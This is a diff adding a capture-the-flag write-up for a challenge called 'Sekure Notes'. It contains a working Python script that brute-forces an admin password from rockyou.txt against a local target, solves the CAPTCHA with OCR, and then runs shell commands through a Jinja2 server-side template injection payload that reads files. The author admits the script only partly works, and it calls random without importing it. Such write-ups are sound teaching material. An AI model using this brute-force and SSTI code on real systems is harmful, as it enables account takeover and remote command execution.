@@ -40,3 +40,190 @@ Exploit a SQL injection vulnerability to extract the flag from a database.
 ---
 **Flag:** `BBCTF{sql_inj3ct10n_101}`
 
+## Sekure Notes   
+
+### Goals
+---
+Bruteforce out the password for login.
+Using SSTI to read the flag.
+
+### Solution
+---
+1. First we download the file given by the challenge.
+2. In the source code, we can see that the user is *admin* and the password needed to be bruteforced using *rockyou.txt* given hint in the challenge.
+3. We can use this script to bruteforce the password:
+```
+import requests
+from PIL import Image
+import io
+import pytesseract
+import time
+import os
+
+# Configuration
+TARGET_URL = "http://localhost:7999/"  # Change this to your target URL
+WORDLIST_PATH = "rockyou.txt"  # Path to your wordlist
+ADMIN_USERNAME = "admin"
+THROTTLE_DELAY = 0.1  # Delay between attempts to avoid rate limiting
+MAX_ATTEMPTS = None  # Set to None for unlimited or a number to limit attempts
+
+def solve_captcha(session):
+    """Attempt to solve the CAPTCHA using OCR with retries"""
+    for _ in range(3):  # Try up to 3 times
+        try:
+            # Get the CAPTCHA image
+            captcha_response = session.get(f"{TARGET_URL}captcha?{int(time.time())}")
+            captcha_image = Image.open(io.BytesIO(captcha_response.content))
+            
+            # Preprocess image to improve OCR accuracy
+            captcha_image = captcha_image.convert('L')  # Grayscale
+            captcha_image = captcha_image.point(lambda x: 0 if x < 128 else 255, '1')  # Binarize
+            
+            # Use Tesseract OCR with custom configuration
+            custom_config = r'--oem 3 --psm 8 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+            captcha_text = pytesseract.image_to_string(captcha_image, config=custom_config).strip()
+            
+            # Validate the OCR result
+            if len(captcha_text) == 5 and captcha_text.isalnum():
+                return captcha_text.upper()
+                
+        except Exception as e:
+            print(f"[-] CAPTCHA solving error: {e}")
+            
+    # If OCR fails after retries, generate a random string (fallback)
+    fallback = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=5))
+    print(f"[-] OCR failed, using fallback CAPTCHA: {fallback}")
+    return fallback
+
+def attempt_login(session, password):
+    """Attempt to login with given password"""
+    captcha_text = solve_captcha(session)
+    
+    login_data = {
+        'username': ADMIN_USERNAME,
+        'password': password,
+        'captcha': captcha_text
+    }
+    
+    response = session.post(TARGET_URL, data=login_data, allow_redirects=True)
+    return "/admin/notes" in response.url
+
+def exploit_ssti(session, command):
+    """Exploit the SSTI vulnerability to execute commands"""
+    payload = f"{{{{ config.__class__.__init__.__globals__['os'].popen('{command}').read() }}}}"
+    response = session.post(f"{TARGET_URL}admin/notes", data={'note': payload})
+    
+    # Extract the result from the response
+    start_marker = '<div style="margin-top: 1rem;">'
+    end_marker = '</div>'
+    try:
+        result = response.text.split(start_marker)[1].split(end_marker)[0]
+        return result.strip()
+    except:
+        return "Failed to extract result"
+
+def brute_force():
+    """Main brute force function"""
+    print(f"[*] Starting brute force attack on {TARGET_URL}")
+    print(f"[*] Using wordlist: {WORDLIST_PATH}")
+    
+    # Check if wordlist exists
+    if not os.path.exists(WORDLIST_PATH):
+        print(f"[-] Error: Wordlist not found at {WORDLIST_PATH}")
+        return
+    
+    # Initialize counters
+    attempts = 0
+    start_time = time.time()
+    session = requests.Session()
+    
+    with open(WORDLIST_PATH, 'r', errors='ignore') as f:
+        for line in f:
+            password = line.strip()
+            if not password:
+                continue
+                
+            attempts += 1
+            if MAX_ATTEMPTS and attempts > MAX_ATTEMPTS:
+                print(f"[*] Reached max attempts ({MAX_ATTEMPTS}), stopping.")
+                break
+                
+            # Print progress every 10 attempts
+            if attempts % 10 == 0:
+                elapsed = time.time() - start_time
+                rate = attempts / elapsed
+                print(f"[*] Attempt {attempts}: Trying '{password}' | Rate: {rate:.2f} attempts/sec")
+            
+            try:
+                if attempt_login(session, password):
+                    print(f"\n[+] SUCCESS! Found credentials: {ADMIN_USERNAME}:{password}")
+                    print(f"[*] Found in {attempts} attempts ({time.time() - start_time:.2f} seconds)")
+                    
+                    # Now exploit the SSTI vulnerability
+                    print("\n[+] Exploiting SSTI vulnerability...")
+                    
+                    # Test command execution
+                    print("[*] Testing command execution with 'id':")
+                    print(exploit_ssti(session, "id"))
+                    
+                    # Search for flag
+                    print("\n[*] Searching for flag...")
+                    common_flag_locations = [
+                        "/flag", "/flag.txt", "/app/flag", "/app/flag.txt",
+                        "/home/flag", "/home/flag.txt", "/root/flag",
+                        "/root/flag.txt", "/var/www/flag", "/var/www/flag.txt"
+                    ]
+                    
+                    for location in common_flag_locations:
+                        result = exploit_ssti(session, f"cat {location} 2>/dev/null")
+                        if result and "No such file" not in result:
+                            print(f"\n[+] FLAG FOUND at {location}:")
+                            print(result)
+                            return
+                    
+                    # If not found, try to find it
+                    print("\n[+] Flag not found in common locations. Searching filesystem...")
+                    find_result = exploit_ssti(session, "find / -name '*flag*' 2>/dev/null")
+                    print("Potential flag locations:")
+                    print(find_result)
+                    
+                    return
+                    
+            except Exception as e:
+                print(f"[-] Error during attempt {attempts}: {e}")
+                session = requests.Session()  # Reset session on error
+                
+            time.sleep(THROTTLE_DELAY)
+    
+    print("\n[-] Brute force completed. Password not found in wordlist.")
+
+if __name__ == "__main__":
+    # Check if pytesseract is available
+    try:
+        pytesseract.get_tesseract_version()
+    except:
+        print("[-] Error: Tesseract OCR is not installed or not in PATH")
+        print("[*] On Ubuntu/Debian, install with: sudo apt install tesseract-ocr")
+        print("[*] On macOS, install with: brew install tesseract")
+        exit(1)
+    
+    brute_force()
+```
+*well it is abit long for the script haha not the correct way as abit too long xd only login works shhhh*
+4. Run the script and it will bruteforce the password. We will get the password as *peaches*.
+5. Now we can login to the website using the password.
+6. Well in the page, we still need to insert something to read the flag.
+7. We can use the following SSTI payload to read the flag:
+   ```html
+{{ config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read() }}
+   ```
+![image](./assets/sekurenotes.png)
+8. Just choose one of them to read the flag.
+
+### Final Result
+---
+**Flag:** `BBCTF{c4ptcha_4nd_sst1_m4st3r!}`
+
+
+
+
